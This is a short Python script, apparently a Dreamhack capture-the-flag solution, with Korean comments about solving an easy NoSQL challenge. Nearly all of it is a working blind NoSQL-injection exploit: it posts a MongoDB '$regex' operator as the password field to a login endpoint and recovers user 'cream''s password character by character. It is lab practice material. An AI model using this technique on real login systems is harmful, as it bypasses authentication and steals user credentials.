# from tqdm import tqdm
# import string
# 웹해킹은 못하는 편이라
# 그냥 쉬운 nosql 문제 하나 찾아서 풀었습니다..
# 다른 분들은 쉬운 문제 풀 때도 어렵게 작성하시길래 놀랐는데.. 의미를 모르고 보니 그런 거더군요..
# 요즘엔 뭔가 내 코드 스타일을 잃어가는 것 같기도 한...
import requests
import re

url = "http://host8.dreamhack.games:18196/login"

bf = '{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
pw = ''

while True:
    for i in bf:
        candidate = pw + i
        regex = f"^{re.escape(candidate)}.*$"

        data = {
            'uid': 'cream', # testuser
            'upw': {'$regex': regex}
        }

        res = requests.post(url, json=data)

        if "auth: 1" in res.text:
            pw += i
            print("[+] FOUND:", pw)

            if i == "}":
                print("[+] PASSWORD COMPLETE:", pw)
                exit()
            break
